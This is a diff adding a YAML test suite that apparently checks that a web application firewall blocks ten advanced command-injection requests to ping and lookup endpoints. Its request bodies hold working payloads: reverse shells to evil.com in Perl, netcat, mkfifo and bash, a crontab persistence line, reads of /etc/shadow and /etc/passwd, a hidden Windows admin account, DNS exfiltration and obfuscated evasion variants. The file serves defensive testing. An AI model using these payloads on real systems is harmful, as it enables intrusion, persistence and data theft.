@@ -1,0 +1,134 @@
+meta:
+  category: "Command Injection"
+  subcategory: "Advanced OS Command Injection"
+  owasp: "A03:2021, WSTG-INPV-12"
+  severity: "critical"
+
+tests:
+  - id: "cmdi-adv-001"
+    title: "Perl reverse shell"
+    tags: ["cmdi", "advanced", "reverse-shell", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; perl -e \"use Socket;$i=\\\"evil.com\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");\""}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-002"
+    title: "Ruby command execution via system()"
+    tags: ["cmdi", "advanced", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; ruby -e \"system(''cat /etc/shadow'')\""}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-003"
+    title: "Netcat reverse shell with -e flag"
+    tags: ["cmdi", "advanced", "reverse-shell", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; nc -e /bin/sh evil.com 4444"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-004"
+    title: "Mkfifo-based reverse shell"
+    tags: ["cmdi", "advanced", "reverse-shell", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc evil.com 4444 >/tmp/f"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-005"
+    title: "Crontab injection for persistence"
+    tags: ["cmdi", "advanced", "persistence", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; echo \"* * * * * /bin/bash -c ''bash -i >& /dev/tcp/evil.com/4444 0>&1''\" | crontab -"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-006"
+    title: "PHP system() command injection in query string"
+    tags: ["cmdi", "advanced", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/tools/lookup"
+      query_string: "host=127.0.0.1;php -r \"system('cat /etc/passwd');\""
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-007"
+    title: "Command injection via IFS variable substitution"
+    tags: ["cmdi", "advanced", "evasion", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1;{cat,/etc/passwd}"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-008"
+    title: "Windows net user account creation"
+    tags: ["cmdi", "advanced", "windows", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1 & net user backdoor Password1! /add & net localgroup Administrators backdoor /add"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-009"
+    title: "Data exfiltration via DNS"
+    tags: ["cmdi", "advanced", "exfiltration", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1;nslookup $(cat /etc/hostname).evil.com"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-adv-010"
+    title: "Command injection via ANSI-C quoting"
+    tags: ["cmdi", "advanced", "evasion", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1;$'\\x63\\x61\\x74'$'\\x20/\\x65\\x74\\x63/\\x70\\x61\\x73\\x73\\x77\\x64'"
+    expected:
+      status: 403
+      action: "block"
